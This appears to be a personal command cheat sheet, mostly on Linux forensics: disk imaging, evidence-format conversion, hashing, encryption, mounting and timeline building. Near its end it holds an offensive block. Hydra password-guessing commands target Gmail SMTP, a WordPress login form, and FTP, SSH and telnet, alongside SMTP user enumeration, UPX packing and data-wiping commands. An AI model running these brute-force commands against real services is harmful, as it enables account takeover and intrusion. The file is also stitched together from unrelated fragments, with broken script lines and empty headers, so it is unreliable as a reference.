srch_strings -e l –t d $Image.dd > $Image.uni.str




## ------------------------------------------------------- ##
##   [?] Grep - Search the ($File.[ascii|uni].str) 
##              using grep, to leverage bulk queries
## ------------------------------------------------------- ##
##   [x] grep -f $File          ## dirty word list
##   [x] grep -i $String        ## ignore case
## ------------------------------------------------------- ##
grep -i password –f dirty_words.txt imagefile.ascii.str










## ------------------------------------------------------------------------------------ ##
##   [?] libevt - Library and tooling to access the Windows Event Log (EVT) format.
## ------------------------------------------------------------------------------------ ##









----------------------------------
Converting Disk|Image File Formats
----------------------------------





## --------------------------------------------------------------------------------------------------------------------------------------------------------------------- ##
		ewfacquire $$Image.raw -t $Image -f encase7          		## Convert Raw -->>  EnCase Expert Witness Format:
		ewfacquire $Image.raw -t $Image.ewf -f encase7
## --------------------------------------------------------------------------------------------------------------------------------------------------------------------- ##
		affconvert $Image.raw													## Convert Raw -->>  AFF
## --------------------------------------------------------------------------------------------------------------------------------------------------------------------- ##
		mksquashfs $Image.raw $image.sfs -comp lzo -noI     ## Convert Raw -->> SquashFS (Compressed)
## --------------------------------------------------------------------------------------------------------------------------------------------------------------------- ##
		sfsimage -i $Image.raw $Image.sfs								## Convert Raw -->> SquashFS
## --------------------------------------------------------------------------------------------------------------------------------------------------------------------- ##
		e2image -r $Image.qcow2 $Image.raw							## Convert Qcow2  -->> Raw Image
## --------------------------------------------------------------------------------------------------------------------------------------------------------------------- ##
		e2image -Q /dev/sda1 $Image.qcow2								## Create A Qcow2 Image From A Hard Drive
## --------------------------------------------------------------------------------------------------------------------------------------------------------------------- ##
		e2image -r /dev/sda1 - | bzip2 > $Image.bz2					## Create A bzip2 Compressed Raw Image File 
																								## Using The Hard Drive /dev/sda1
## --------------------------------------------------------------------------------------------------------------------------------------------------------------------- ##







find / -xdev -inum $Inode



e2mmpstatus /dev/sdb                ## used to check Multiple-Mount Protection (MMP) status of an ext4

e2mmpstatus -i                      ## prints out the MMP information rather than check it







##-==============================================================-##
##  [+] 
##-==============================================================-##


##-==============================================================-##
##  [+] 
##-==============================================================-##


##-==============================================================-##
##  [+] 
##-==============================================================-##















mmls -i list                    ## list the Sleuth Kit Supported image format types




ftkimager /dev/$Disk image --frag 20GB --s01    ## Acquired Image - maximum fragment size set at 20GB,
ewfacquire -S 2G /dev/$Disk                     ## Acquired Image - maximum segment file size 2G


ewfacquire -C "2019-001" -d sha1 -D "Thumb drive seized from
bad guy" -e "Barry J. Grundy" -E "2019-001-002" -m removable -M physical -S 512M
-t case1.disk2 -u /dev/sdb



## --------------------------------------------------------------- ##
##   [?] Raw Images - Dont contain headers or meta information.
## --------------------------------------------------------------- ##


##-====================================================-##
##  [+] Compressing and splitting during acquisition:
##-====================================================-##
## ---------------------------------------------------- ##
## acquiring an image with dd
## compressing it with gzip
## and splitting it into CD-sized chunks:
## ---------------------------------------------------- ##

dd if=/dev/$Disk | gzip | split -d -b 640m - $image.raw.gz     ## split an image into CD-sized chunks:
split -d -b 4G $image.raw $image.raw                           ## split an image into DVD-sized chunks:

fls -o 63 -i split $File.000 $File.001 $File.002        ## Sleuth Kit - Split 


dcfldd if=/dev/$Disk split=16G of=$image.raw            ## using dcfldd, acquisition A disk in 16G split fragments
dc3dd if=/dev/$Disk ofsz=640M ofs=$image.raw.000        ## using dc3dd, acquisition A disk in 16G split fragments



##-======================================================================-##
##  [+] Concatenating The set of image fragments into a single image:
##-======================================================================-##
## ---------------------------------------------------------------------- ##
##  [?] Reassemble a series of Split Image fragments using Concatenation
## ---------------------------------------------------------------------- ##
cat $Image.raw.* > $Image.raw



##-==================================================-##
##        [+] Reassemble The split pieces:
##  [?] Concatenate the files into a single image:
##-==================================================-##
cat /dvd/$Image.raw.gz.00 > $Image.raw.gz
cat /dvd/$Image.raw.gz.01 >> $Image.raw.gz
cat /dvd/$Image.raw.gz.02 >> $Image.raw.gz
cat /dvd/$Image.raw.gz.03 >> $Image.raw.gz



ls -1 $Image.raw.*                               ## list the split pieces files

strace -e open $Image.raw.*                      ## 





cat $Image.raw.* > $Image.raw                   ## Reassemble a Split Image
cat $Image.raw.gz.* | zcat | 
cat $Image.raw.gz.* | zcat > $Image.raw         ## piping the split files into zcat and redirecting to a file:

dd if=/dev/$Disk | gzip > $Image.raw.gz         ## dd Aquisition - Piping To GZip For On The Fly Compression
dcfldd if=/dev/$Disk | gzip > $Image.raw.gz     ## dcfldd image data stream --> stdout | gzip compressed, then redirected into a compressed file.
dc3dd if=/dev/$Disk | gzip > $Image.raw.gz      ## dc3dd Aquisition - Piping To GZip For On The Fly Compression

mmls $Image.raw.*



zcat $Image.raw.gz | sha256sum                  ## zcat uncompresses it, then pipes SHA256sum to determine the sha256 cryptographic hash.
cat $Image.raw.* | sha256sum                    ## Check the SHA256 hashsum of a Reassembled a Split Image split raw images

ewfinfo $Image.E01                  ## Examine File Hashes
affinfo -S $Image.aff               ## validity checking for AFF files
ewfverify $Image.Ex01               ## evidence integrity checking - validate the hash
img_stat $Image.E01                 ## evidence integrity checking - 



fls -r $Image 2                      ## get a list of all files and directories in an image use:
fls -d -p $Image 29                  ## get the full path of deleted files in a given directory:
fls -m /usr/local $Image 2           ## get the mactime output
fls -o 63 $Disk-img.dd              ## the file system starts in sector 63:
fls -v -l $image.raw                ## Display file details in long format

## ================================================================================================================== ##
fls -r image 2							## get a list of all files and directories in an image use:
## ================================================================================================================== ##
fls -r image							## specify root directory inode is used):
## ================================================================================================================== ##
fls -d -p image 29						## get the full path of deleted files in a given directory:
## ================================================================================================================== ##
fls -m /usr/local image 2				## get the mactime output do:
## ================================================================================================================== ##
fls -o 63 disk-img.dd					## If you have a disk image and the file system starts in sector 63, use:
## ================================================================================================================== ##
fls -i "split" -o 63 disk-1.dd disk-2.dd disk-3.dd		## If you have a disk image that is split use:
## ================================================================================================================== ##



fls -i "split" -o 63 $Disk-1.dd $Disk-2.dd $Disk-3.dd      ## disk image that is split:


## HFS+	Special	File Extrac7on from	Image File using The Sleuth Kit	
icat -f hfs –o $PartitionOffset *.dd $Inode > $SpecialFile




##-=====================================================-##
##  [+] List the contents of a BSD system 
##      That Starts in sector 12345 of a split image:
##-=====================================================-##
mmls -t bsd -o 12345 -i split $Disk-1.dd $Disk-2.dd



mmls $Image.dd          ## list the partition table
mmls -m                 ## Show metadata volumes
mmls -A                 ## Show unallocated volumes
mmls -a                 ## Show allocated volumes
mmls -B                 ## Include a column with the partition sizes in bytes
mmls -r                 ## Recurse  into  DOS  partitions and look for other partition tables.
mmls -v


ewfinfo -i          ## only show EWF acquiry information
ewfinfo -m          ## only show EWF media information
ewfinfo -e          ## only show EWF read error information


##-============================================================================-##
##  [+] converting AFF --> compressed SquashFS (forensic evidence container)
##-============================================================================-##
affcat $image.aff | sfsimage -i - $image.sfs      ## converting AFF --> compressed SquashFS 
                                                  ##    (forensic evidence container)


##-===========================================-##
##   [+] convert AFF images --> raw image
##-===========================================-##
affconvert -r $image.aff                         ## convert AFF images to a raw image


##-=======================================================-##
##   [+] ftkimager tool converts between EnCase and FTK
##-=======================================================-##
## ------------------------------------------------------- ##
##      a set of compressed FTK SMART *.s01 files
##     are converted to the EnCase EWF *E01 format:
## ------------------------------------------------------- ##

##-=====================================================================-##
##  [+] Convert from FTK SMART *.s01 --> EnCase EWF *E01 format
##-=====================================================================-##
ftkimager $Image.s01 image --e01


##-=====================================================================-##
##  [+] Convert Files from EnCase EWF *E01 format --> FTK SMART *.s01
##-=====================================================================-##
ftkimager $Image.E01 image --s01


aimage --lzma_compress --compression=9 /dev/$Disk $image.aff
affcat $Image.aff | ftkimager - image --s01                     ## convert a AFF image to EnCase or FTK
affcat $Image.aff > $Image.raw                                  ## convert a raw image to an AFF format
affconvert -r $Image.aff                                        ## convert AFF images to a raw image
affconvert $Image.raw                                           ## convert a raw image -->> an AFF

affinfo $Image.aff > $affinfo.txt                   ## extract the metadata from AFF files
sfsimage -a $affinfo.txt $Image.sfs                 ## add the AFF Metadta to the SquashFS forensic evidence container

ftkimager $Image.s01 image --e01                    ## Converting FTK *.s01 --> EnCase EWF *E01 format
ftkimager $Image.E01 image --s01                    ## Convert EnCase EWF *E01 --> FTK *.s01
ftkimager --compress 9 --s01 /dev/$Disk $image      ## FTK Smart Compressed Acquisition
ewfacquire $Image.raw -t $Image -f encase7          ## convert $image.raw to EnCase Expert Witness format:
ewfacquire -c bzip2:best -f encase7-v2 /dev/$Disk   ## EnCase EWF Compressed Acquisition
ewfinfo $Image.E01                                  ## Examine File Hashes


affcat $Image.aff | sfsimage -i - $Image.sfs        ## converting AFF --> compressed SquashFS 
mksquashfs $Image.raw $Image.sfs -comp lzo -noI     ## raw image -->> compressed SquashFS
zcat $Image.raw.gz | sfsimage -i - $image.sfs       ## gzipped raw image -->> SquashFS compressed file:
sfsimage -i $Image.raw $Image.sfs                   ## Convert raw image -->> SquashFS
sfsimage -m $Image.sfs                              ## mount the *.sfs file
unsquashfs -lls $Image.sfs                          ## view the contents of a SquashFS file
affconvert -Oaff $image.sfs.d/$image.raw            ## [ (raw image) inside a SquashFS ] --> AFF file



## -------------------------------------------------------------------------------------------------------------------------- ##
    	affcopy -vv $File1 $File2 $File3 $Dir       ## Copy all files to dir:
## -------------------------------------------------------------------------------------------------------------------------- ##
    	affcopy -d $File $Dir									## Print debugging information
## -------------------------------------------------------------------------------------------------------------------------- ##
    	affcopy -k $File.key $File.aff              		## Specify private key for signing.
## -------------------------------------------------------------------------------------------------------------------------- ##
    	affcopy -c $File.cer $File.aff              		## Specify a X.509 certificate 
																			##  that matches the private key 
## -------------------------------------------------------------------------------------------------------------------------- ##



##-============================================-##
##      [+] Copy file1 to dir1, file2 to dir2 and file3 to dir3:
##-============================================-##
affcopy -vv $File1 $File2 $File3 $Dir1 $Dir2 $Dir3


##-=====================================-##
##     [+] Encrypting AFF Files With AFFCopy:
##-=====================================-##
affcopy -vv $File.aff file://:$Password@/$EncryptedFile.aff


##-===============================================-##
##      [+] Copy all files in the current directory 
##            To your default S3 bucket with X9 compression:
##-===============================================-##
affcopy -vy -X9 *.aff s3:///




affuse  $AFFImage.aff $MountPoint           ## Mount AFF Image
fusermount -u $MountPoint                   ## unmount AFF Image





##  ------------------------------------------------ ##>~x~<## ---------------------------------------------------------------------------------- ##
    	 affsign -k $File.key $File.aff						##   [?]  Specify private key for signing.
##  ------------------------------------------------ ##>~x~<## ---------------------------------------------------------------------------------- ##
    	affsign -c $File.cer $File.aff      					## Specify a X.509 certificate that matches the private key                                 ## [?] by default, the file is assumed to be the same one provided with the -k option.
##  ------------------------------------------------ ##>~x~<## ---------------------------------------------------------------------------------- ##
    	affsign -n $File.aff                						## Ask for a chain-of-custody note.
##  ------------------------------------------------ ##>~x~<## ---------------------------------------------------------------------------------- ##
    	affsign -Z $File.aff                						## ZAP (remove) all signature segments.
##  ------------------------------------------------ ##>~x~<## ---------------------------------------------------------------------------------- ##
    	affverify -v $File.aff              						## Verify the digital signature on a signed file
##  ------------------------------------------------ ##>~x~<## ---------------------------------------------------------------------------------- ##
    	affverify -v -a $File.aff           						## Print all segments
##  ------------------------------------------------ ##>~x~<## ---------------------------------------------------------------------------------- ##
    	affstats -m $File.aff               						## Print all output in megabytes.
##  ------------------------------------------------ ##>~x~<## ---------------------------------------------------------------------------------- ##







##-=========================================================-##
##   [+] [ (raw image) inside a SquashFS ] --> AFF file:
##-=========================================================-##
affconvert -O aff $Image.sfs.d/$Image.raw        ## [ (raw image) inside a SquashFS ] --> AFF file



##-=========================================================-##
##   [+] gzipped raw image --> SquashFS compressed file:
##-=========================================================-##
zcat $Image.raw.gz | sfsimage -i - $Image.sfs



##-=========================================================-##
##   [+] Converting from a raw image to FTK SMART Format:
##-=========================================================-##
ftkimager $Image.raw image --s01 --case-number 1 --evidence-number 1 --description "The case of the missing red stapler" --examiner "S. Holmes" --notes "This USB stick was found at the scene"




##-=========================================================================-##
##   [+] Compress An Image On The Fly During A Forensic Image Aquisition:
##-=========================================================================-##
dcfldd if=/dev/sde status=on | gzip > sde.raw.gz
dc3dd if=/dev/sde verb=on | gzip > sde.raw.gz


##-===============================================================================================-##
##   [+] zcat uncompresses it, then pipes SHA256sum to determine the sha256 cryptographic hash.
##-===============================================================================================-##
zcat $Image.raw.gz | sha256sum
zcat $Image.raw.gz | sha512sum
zcat sde.raw.gz | sha256sum

##-==================================================-##
##   [+] FTK SMART Compression During Aquisition:
##-==================================================-##
ftkimager --compress 9 --s01 /dev/sde $Image


##-=========================================================-##
##   [+] AFFlib Built-in Compression During Aquisition:
##-=========================================================-##
aimage --lzma_compress --compression=9 /dev/sde $Image.aff



##-==================================================-##
##   [+] SquashFS Compressed Evidence Containers:
##-==================================================-##
mksquashfs $Image.raw $Image.sfs -comp lzo -noI




dc3dd if=$Image.raw of=/dev/$Disk log=clone.log        ## Write an Image File to a Clone Disk

openssl aes-256-cbc -salt -md sha256 -in $In -out $Out



##-=========================================================================================-##
##   [+] Encrypt an image with 256-bit AES using cipher block chaining mode
##-=========================================================================================-##
openssl enc -aes-256-cbc -in $Image.raw -out $Image.raw.aes


##-=========================================================================================-##
##   [+] Perform encryption during acquisition
##-=========================================================================================-##
dcfldd if=/dev/$Disk status=on | openssl enc -aes-256-cbc > $Image.raw.aes
dcfldd if=/dev/sde status=on | openssl enc -aes-256-cbc > sde.raw.aes
dc3dd if=/dev/sde verb=on | openssl enc -aes-256-cbc > sde.raw.aes

##-=========================================================================================-##
##   [+] Decrypting The OpenSSL-encrypted file
##-=========================================================================================-##
openssl enc -d -aes-256-cbc -in $Image.raw.aes -out $Image.raw    
openssl enc -d -aes-256-cbc -in sde.raw.aes -out sde.raw

##-=========================================================================================-##
## Add compression on the fly during an acquisition, add gzip to the pipe
##-=========================================================================================-##
dcfldd if=/dev/$Disk status=on | gzip | openssl enc -aes-256-cbc > $Image.raw.gz.aes
dc3dd if=/dev/$Disk verb=on | gzip | openssl enc -aes-256-cbc > $Image.raw.gz.aes

##-=======================================================================-##
##  1). The decryption syntax takes the compressed and encrypted file as input
##  2). It then Pipes the decrypted output to gunzip, 
##  3). The raw image is piped to sha256sum.
## ----------------------------------------------------------------------- ##
##   TLDR: verify the cryptographic hash of the image
##-=======================================================================-##
openssl enc -d -aes-256-cbc < $Image.raw.gz.aes | gunzip | md5sum






##-=======================================================================-##
##   [+] Compress Files or A Directory 
##   [+] Pipe To GZip For Compression
##   [+] GnuPG Symmetric Encrypted Output (Encrypted With A Passphrase)
##-=======================================================================-##
tar -c $Files | gzip | gpg -c | dd of=~/$File.tar.gz.gpg
tar -c $Dir | gzip | gpg -c | dd of=~/$File.tar.gz.gpg


##-=======================================================================-##
##   [+] GnuPG Symmetric Encrypt A File (Encrypted With A Passphrase)
##-=======================================================================-##
gpg --verbose --symmetric --cipher-algo aes256 --digest-algo sha512 --cert-digest-algo sha512 --s2k-mode 3 --s2k-count 65011712 --s2k-cipher-algo AES256 --s2k-digest-algo SHA512 $File


##-===========================================================================-##
##   [+] Use GPG to encrypt a specified image, using symmetric encryption:
##-===========================================================================-##
gpg -cv $Image.raw


##-=========================================================================================-##
##   [+] encrypt on the fly during acquisition:
## ------------------------------------------------------------------------------ ##
##   1). dcfldd acquires the attached disk via /dev/$Disk 
##   2). pipes the disk directly into GPG, which reads from stdin, and encrypts to stdout.       ## GPG then redirects the finished GPG-encrypted image to an output file
## ------------------------------------------------------------------------------ ##
dcfldd if=/dev/$Disk status=on | gpg -cv > $Image.raw.gpg
dc3dd if=/dev/$Disk verb=on | gpg -cv > $Image.raw.gpg

dcfldd if=/dev/$Disk status=on | gpg --verbose --symmetric --cipher-algo aes256 --digest-algo sha512 --cert-digest-algo sha512 --s2k-mode 3 --s2k-count 65011712 --s2k-cipher-algo AES256 --s2k-digest-algo SHA512 > $image.raw.gpg
dc3dd if=/dev/$Disk verb=on | gpg --verbose --symmetric --cipher-algo aes256 --digest-algo sha512 --cert-digest-algo sha512 --s2k-mode 3 --s2k-count 65011712 --s2k-cipher-algo AES256 --s2k-digest-algo SHA512 > $image.raw.gpg


##-=================================================================================-##
##   [+] Decrypt GPG-encrypted image - Send Raw image to stdout (Output to file)
##-=================================================================================-##
## ------------------------------------------------------------------------------ ##
##   1). The GPG-encrypted image file is decrypted
##   2). The raw image is written to a file.
## ------------------------------------------------------------------------------ ##
gpg -dv -o $image.raw $image.raw.gpg
gpg -dv -o sde.raw sde.raw.gpg



##-=========================================================================================-##
##   [+] Symmetric Encryption - Decrypting A GPG-encrypted file - Piping it to sha256sum
##-=========================================================================================-##
## ----------------------------------------------------------------------------------------- ##
##           [+] The integrity is verified by Comparing:
##   (GPG-encrypted image) <--> (raw image file SHA256 Hashsum)
## ----------------------------------------------------------------------------------------- ##
gpg -dv $Image.raw.gpg | sha256sum





zcat $Image.raw.gz | sha256sum      ## zcat uncompresses it, then pipes SHA256sum to determine the sha256 cryptographic hash.
cat $Image.raw.* | sha256sum        ## Check the SHA256 hashsum of the split raw images

ewfinfo $Image.E01              ## Examine File Hashes
ewfinfo ewf.E01

affinfo -S $Image.aff           ## validity checking for AFF files

ewfverify $Image.Ex01           ## evidence integrity checking - validate the hash
ewfverify ewf.E01

img_stat $Image.E01             ## evidence integrity checking - 
img_stat ewf.E01

fsstat $Image.dd                ## Displays details about the file system
fsstat sde.raw

ils $Image.dd                   ## Displays inode details
ils sde.raw

fls -v -l $Image.raw
fls -v -l sde.raw

img_stat $Image.raw
img_stat sde.raw

qemu-img info $Image.raw
qemu-img info sde.raw

qemu-img info $Image.raw.aes
qemu-img info sde.raw.aes

openssl sha256 ewf.*
openssl sha512 ewf.*

openssl sha256 *.aff
openssl sha512 *.aff

openssl sha256 $Image.raw
openssl sha512 $Image.raw

openssl sha256 $File.raw.gz
openssl sha512 $File.raw.gz

openssl sha256 $Image.raw.gpg
openssl sha512 $Image.raw.gpg

openssl sha256 $File.tar.gz.gpg
openssl sha512 $File.tar.gz.gpg

openssl sha256 $Image.raw.gz.aes
openssl sha512 $Image.raw.gz.aes

openssl sha256 $Image.aff
openssl sha512 $Image.aff

grep "(sha256)" $hashlog.txt
diff $hash1.log $hash2.log            ## Check integrity of forensic images using cryptographic hashes
gpg < $hash.log.asc                  ## verify the gpg signature of the signed acquisition disk image:
gpgsm --verify $Image.log.pem        ## S/MIME signed messages - validate signature of a PEM file


##-=============================================-##
##   [+] FreeTSA
##-=============================================-##
## --------------------------------------------- ##
##   [?] the CA cert is fetched from FreeTSA:
## --------------------------------------------- ##
curl http://freetsa.org/files/cacert.pem > $CACert.pem

##-================================-##
##   [+] Validate The Timestamp:
##-================================-##
openssl ts -verify -in $Hash.log.tsr -queryfile $Hash.log.tsq -CAfile $CACert.pem


## ----------------------------------- ##
##   [?] Timestamp Query ( tsq ) 
##   [?] Timestamp Reponse ( tsr )
## ----------------------------------- ##









mount a disk in rescue mode

mount -o barrier=0 /dev/sda



##-=====================================-##
##   [+] Changing/transferring Root:
##-=====================================-##

## ----------------------------------------------------------- ##
##   [?] Changing the root is the process of transferring 
##       your working root directory to another device:
## ----------------------------------------------------------- ##


## -------------------------------------------------- ##
##   [?] In order to do that, you need to mount 
##       your root disk with execute permissions:
## -------------------------------------------------- ##

mount -o exec,barrier=0 /dev/sda



##-============================================================-##
##   [+] Remote Acquisition to a SquashFS Evidence Container

ssh root@remote-pc "dd if=/dev/mmcblk0" | sfsimage -i - $Image.sfs


##-======================================================================-##
##   [+] use ssh to pipe the disk image over ssh to the remote machine

dd if=/dev/sda1 | ssh $User@192.168.0.2 "cat > /home/$User/$Image.img"


##-======================================================-##
##   [+] Reimage /dev/hda1 with a file you have saved

dd if=/mnt/$ExternalDrive/$Image.img of=/dev/sda1


##-=======================================================================-##
##   [+] Restore Hard drive Image Through The network Tunneled over SSH

ssh $User@192.168.0.2 "cat /home/$User/$Image.img" | dd of=/dev/sda1


##-===============================================================-##
##   [+] Output your microphone to a remote computers speaker

dd if=/dev/dsp | ssh -c arcfour -C $User@$Host dd of=/dev/dsp


##-============================================-##
##   [+] Mount folder/filesystem through SSH
##-============================================-##
sshfs name@server:/$Dir /mnt/
-o ssh_protocol=1
-o port=PORT



fusermount3 -u mountpoint




mount.fuse3 drop_privileges






mksquashfs /etc /tmp/etc.squashfs
dd if=/dev/zero of=/tmp/etc.hash bs=1M count=10
veritysetup format /tmp/etc.squashfs /tmp/etc.hash
openssl smime -sign -in <hash> -nocerts -inkey private.key -signer private.crt -noattr -binary -outform der -out /tmp/etc.p7
mount -o verity.hashdevice=/tmp/etc.hash,verity.roothash=<hash>,verity.roothashsig=/tmp/etc.p7 /tmp/etc.squashfs /mnt

create squashfs image from /etc directory, 
verity hash device and mount  verified filesystem image to /mnt.  
The kernel will verify that the root hash is signed by a key 
from the kernel keyring if roothashsig is used.


mount -t overlay  overlay  -olowerdir=/lower,upperdir=/upper,workdir=/work  /merged


zfs-fuse


--log-uberblocks
--fuse-mount-options
--enable-xattr



fsfreeze

fiwalk
statfs

encfsctl

fanotify

e2image
fusermount3

procfs
sysfs













##-================================================-##
##   [+] Compare a remote file with a local file
##-================================================-##
ssh user@host cat /path/to/remotefile | diff /path/to/localfile -


##-==================================================-##
##   [+] SSH connection through host in the middle
##-==================================================-##
ssh -t reachable_host ssh unreachable_host












hdparm --verbose --dco-identify /dev/sda
hdparm --verbose --dco-restore


##-=====================================================-##
##   [+] Remove DCO from the hard drive on /dev/sda:
##-=====================================================-##
tableau-parm -r /dev/sda




shred --force --iterations=1 --verbose --remove='wipesync' --zero 

shred --force --iterations=4 --verbose --remove='wipesync' --zero 


shred --verbose --iterations=7 --zero --force 
rm --verbose --recursive --force $File|$Dir

wipe -i -r -f -c $File|$Dir

srm -r -v -z $File|$Dir
srm -v -z 

dc3dd wipe=/dev/$Disk

time dcfldd if=/dev/sdc of=



##-========================================================-##
##   [+] Partition scanning to identify lost partitions.
##-========================================================-##
gpart $Image.raw


##-===============================================-##
##   [+] Repair and recover damaged partitions
##-===============================================-##
testdisk /list /dev/$Disk







zpool create -f -m /mnt/ZPool-ZFS ZPool-ZFS /dev/sdc
zpool import -d /mnt/ZPool-ZFS/Scripts ZPool-ZFS/Scripts
zfs set mountpoint=/mnt/ZPool-ZFS/Scripts ZPool-ZFS/Scripts

zpool import -d /mnt/ZPool-ZFS ZPool-ZFS

zpool export -f 
zfs unmount ZPool-ZFS/Scripts
umount /mnt/ZPool-ZFS/Scripts
zfs unmount -f ZPool-ZFS/Scripts

zpool get health ZPool-ZFS
zpool status -v ZPool-ZFS
chmod -v -R ugo+rwx /mnt/ZPool-ZFS
chown -v -R xe1phix /mnt/ZPool-ZFS

zfs list -o mounted,name,used,avail,copies,rdonly,mountpoint,type
zfs list -o name,used,avail,aclmode,aclinherit,zoned,xattr,copies,checksum,compress,rdonly
zpool get all ZPool-ZFS

zfs create -o exec=off -o compression=on -o setuid=off -o xattr=on -o checksum=sha256 -o zoned=on ZPool-ZFS/Scripts
zfs set exec=off ZPool-ZFS/Scripts
zfs set zoned=on ZPool-ZFS/Scripts
zfs set setuid=off ZPool-ZFS/Scripts
zfs set vscan=on ZPool-ZFS/Scripts
zfs set readonly=on ZPool-ZFS/Scripts
zfs set compression=zls ZPool-ZFS/Scripts
zfs set copies=2 ZPool-ZFS/Xe1phixGitLab
zfs set xattr=on ZPool-ZFS


zfs set compression=on ZPool-ZFS/Scripts
zfs snapshot -r ZPool-ZFS/Xe1phixGitLab@today




ewfmount image.E01 raw


ewfmount $ewf.E01 /mnt/ewf          ## Attach Local or Remote System Drive
cd /mnt/ewf
vshadowmount ewf1 /mnt/vss          ## Mount VSS Volume


##-=============================================-##
##   [+] Run fls across ewf1 mounted image
##-=============================================-##
fls –r –m C: ewf1 >> /cases/vss-bodyfile


fls -o 63 -i afflib foo.vmdk


/usr/share/doc/libafflib0v5/aff4_crypto.txt.gz
/usr/share/doc/libafflib0v5/crypto_api.txt
/usr/share/doc/libafflib0v5/crypto_design.txt.gz
/usr/share/doc/libafflib0v5/crypto_doc.txt.gz
/usr/share/doc/libafflib0v5/filetypes.txt
/usr/share/doc/libafflib0v5/threading.txt
/usr/share/doc/libafflib0v5/upload.txt
/usr/share/doc/afflib-tools/README
/mnt/ZPool-ZFS/Xe1phixGitLab/Xe1phixGitLabProjects/Stable/ParrotLinux-Public-Kios-Project/Xe1phix-Hardened-ParrotKios-Projects-Production/Xe1phix-Wiki/sift-docs/packages/afflib.rst








##-=============================================-##
##   [+] Run fls Across All Snapshot Images
##-=============================================-##
for i in vss*; do fls -r –m C: $i >> /cases/vss-bodyfile; done


##-==================================================-##
##   [+] De-Duplicate Bodyfile using sort and uniq
##-==================================================-##
sort /cases/vss-bodyfile | uniq > /cases/vss-dedupe-bodyfile


##-===================================================-##
##   [+] Run mactime Against De-Duplicated Bodyfile
##-===================================================-##
mactime –d –b /cases/vss-dedupe-bodyfile –z EST5EDT MM-DD-YYYY..MM-DD-YYYY > /cases/vss-timeline.csv



ewfmount image.E01 mountpoint

mount –o loop,ro,show_sys_files,streams_interface=windows /mnt/ewf/ewf1 /mnt/windows_mount



##-=============================================-##
##   [+] Mount a temporary ram partition

mount -t tmpfs tmpfs /mnt -o size=1024m




losetup -f --show
losetup -l                  ## List partition mappings
losetup -r                  ## Read-only partition mappings


fsck /dev/mapper/loop1p1            ## loop1p1 is the name of a device file under /dev/mapper which you can use to access the partition

kpartx -av disk.img                 ## mount all the partitions in a raw disk image:
kpartx -r -a -v raw/ewf1            ## Read-only partition mappings.
kpartx -d image.raw                 ## remove the devices
## loop deleted : /dev/loop0



##-===============================-##
##   [+] Create a Loop Device
##-===============================-##
losetup /dev/loop0 /home/bob/safe.img




kpartx -a -s -v "$img" 2>&1




xmount --cache xmount.cache --in raw image.raw --out vdi virtual
ls virtual/



xmount --in ewf --out dmg ~/$Dir/$ewf.E01 /$Dir/$Image/












------------------------
Creating Super Timelines
------------------------


## Find partition starting sector
mmls $Image.dd - calculate offset ##### (sector *512)


## Mount image for processing
mount -o ro, noexec,show_sys_files,loop,offset=##### image.dd /mnt/windows_mount


## Create Comprehensive Timeline
log2timeline -p -r -f winxp -z CST6CDT /mnt/windows_mount -w timeline.csv


## Filter Timeline
l2t_process -b timeline.csv -k keywords.txt MM-DD-YYYY..MM-DD-YYYY




------------------------
log2timeline (aka plaso)
------------------------


## ------------------------------------------------- ##
##    [?] Plaso is the successor to log2timeline
## ------------------------------------------------- ##

log2timline_legacy          ## log2timeline
log2timeline                ## log2timeline
log2timeline.py             ## Plaso





##-=================================-##
##  [+] Creating Super Timelines
##-=================================-##
log2timeline –r –p –z <system-timezone> –f <type-input> /mnt/windows_mount –w $timeline.csv



mount –o loop,ro,show_sys_files,streams_interface=windows $imagefile.dd /mnt/windows_mount


log2timeline –z EST5EDT –p –r -f win7 /mnt/windows_mount -w /cases/$bodyfile.txt



l2t_process –b /cases/$bodyfile.txt –w $whitelist.txt 04-02-2012 > $timeline.csv




##-=====================================-##
##  [+] Create Comprehensive Timeline
##-=====================================-##
log2timeline.py plaso.dump datafile.img


##-=======================-##
##  [+] Filter Timeline
##-=======================-##
psort.py -z "EST5EDT" -o L2tcsv plaso.dump "date > 'YYYY-MM-DD HH:MM:SS' AND date < 'YYYY-MM-DD HH:MM:SS'" > supertimeline.csv

psort.py plaso.dump FILTER > supertimeline.csv







echo -e "$SUCCESS Access to server at $p granted!"
SHARES=$(echo "$RESULT" | awk '/Sharename/,/Server               Comment/' | egrep -v "Sharename       |---|Server               |^$" | grep -v "Anonymous login" | grep -v "NT_STATUS_RESOURCE_NAME_NOT_FOUND" | grep -v "NetBIOS over TCP" | awk '{print $1}')
while read -r line; do

"NetBIOS over TCP" | awk '{print $1}'





testing server at $p with credentials from $AUTH_FILE"
COMMAND="smbclient -L $p -A $AUTH_FILE




Info about mail accounts
gmail
server: smtp.gmail.com
port: 465
hotmail
server: smtp.live.com
port: 587
yahoo
server: smtp.mail.yahoo.com
port:587



hydra server smtp -l example@gmail.com -P wordlist -s port -S -v -V

hydra smtp.gmail.com smtp -l example@gmail.com -P /home/user/Desktop/rockyou.txt -s 465 -S -v -V


hydra -v http://site.com/ http-form-post "wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location" l admin -P password_path



hydra -L $USER_FILE -P $PASS_FILE $TARGET ftp -f

hydra -L $USER_FILE -P $PASS_FILE $TARGET ssh -f 

hydra -L $USER_FILE -P $PASS_FILE $TARGET telnet -f 

smtp-user-enum -M VRFY -U $USER_FILE -t $TARGET

xsstracer $TARGET 80




atk6-

dnsdict6 $TARGET $DNS_FILE -4 | awk '{print $1}' | sort -u | sed -r 's/.com./.com/g'


atk6-alive6 eth0 -l > /dev/null && atk6-alive6 eth0 > /dev/null && arp-scan -l | head -n -2 | tail -n +3 > arp && ip -6 neigh > neigh && for line in $(cat neigh | cut -d" " -f5 |sort -u); do grep $line arp && grep $line neigh && echo -e '\n';  done; rm arp neigh







## UPX packs orig.exe
upx -9 -o out.exe orig.exe


gee -o outfile myfile.c













echo "################################"
echo "########## stegdetect ##########"
echo "################################"
stegdetect $FILE


echo "##############################"
echo "########## steghide ##########"
echo "##############################"
steghide extract -sf $FILE -p ""


echo "##############################"
echo "########## outguess ##########"
echo "##############################"
outguess -r $FILE $TMP_FILE
check_result_file $TMP_FILE



stegoveritas.py $FILE -outDir $TMP_DIR -meta -imageTransform -colorMap -trailing



identify -verbose stego.jpg


##-=====================================-##
##   [+] Carve out embedded/appended files
##-=====================================-##
foremost stego.jpg



##-==================================================-##
##   [+] recode the file and throw away the result
##-==================================================-##
ffmpeg -v info -i stego.mp3 -f null




##-=====================================-##
##		[+] Log fls

fls /forensic/floppy$1/forensic$1.iso > /forensic/floppy$1/logs/logfls$1.txt


##-=====================================-##
##		[+] Change directory

